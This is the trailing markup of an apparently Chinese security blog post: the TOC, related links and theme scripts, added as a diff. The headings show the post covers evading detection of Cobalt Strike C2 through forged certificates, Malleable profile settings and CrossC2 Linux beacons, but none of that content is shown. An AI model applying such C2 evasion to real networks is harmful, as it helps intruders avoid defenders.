class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/09/25/3c3f9499/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/09/26/da146604/">CS-云函数隐匿C2</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/09/24/3c3f9499/">CS-Cobalt Strike必备知识</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="\2024\10\27\77c80f0f\" title="CS-C语言总结"><span class="title">CS-C语言总结</span></a><a class="item" href="\2024\09\26\da146604\" title="CS-云函数隐匿C2"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="\2024\10\28\ce454855\" title="CS-开发环境配置及exe处理"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%B9%E5%BE%81"><span class="toc-text">什么是特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BF%AE%E6%94%B9%E7%89%B9%E5%BE%81"><span class="toc-text">为什么要修改特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E7%89%B9%E5%BE%81"><span class="toc-text">如何修改特征</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-text">修改默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E8%AF%81%E4%B9%A6"><span class="toc-text">修改默认证书</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%BB%98%E8%AE%A4%E8%AF%81%E4%B9%A6"><span class="toc-text">查看默认证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6"><span class="toc-text">生成伪造证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Certbot%E5%85%8D%E8%B4%B9%E7%94%B3%E8%AF%B7SSL%E8%AF%81%E4%B9%A6"><span class="toc-text">Certbot免费申请SSL证书</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Certbot"><span class="toc-text">安装Certbot</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0A%E8%AE%B0%E5%BD%95"><span class="toc-text">添加A记录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2"><span class="toc-text">转换</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEProfile"><span class="toc-text">配置Profile</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSL%E8%AF%81%E4%B9%A6%E8%AE%BE%E7%BD%AE"><span class="toc-text">SSL证书设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCP"><span class="toc-text">TCP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Beacon"><span class="toc-text">DNS-Beacon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-Beacon"><span class="toc-text">SSH-Beacon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Http-Stager"><span class="toc-text">Http-Stager</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Http-Config"><span class="toc-text">Http-Config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Http-Get"><span class="toc-text">Http-Get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Http-Post"><span class="toc-text">Http-Post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage"><span class="toc-text">Stage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-Ex"><span class="toc-text">Post-Ex</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Inject"><span class="toc-text">Process-Inject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Prepend"><span class="toc-text">Prepend</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rich-Header"><span class="toc-text">Rich_Header</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5profile%E6%96%87%E4%BB%B6"><span class="toc-text">检查profile文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E9%85%8D%E7%BD%AElinux%E4%B8%8A%E7%BA%BF"><span class="toc-text">CS配置linux上线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-CrossC2"><span class="toc-text">下载 CrossC2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6"><span class="toc-text">安装插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E6%B5%8B%E8%AF%95"><span class="toc-text">上线测试</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
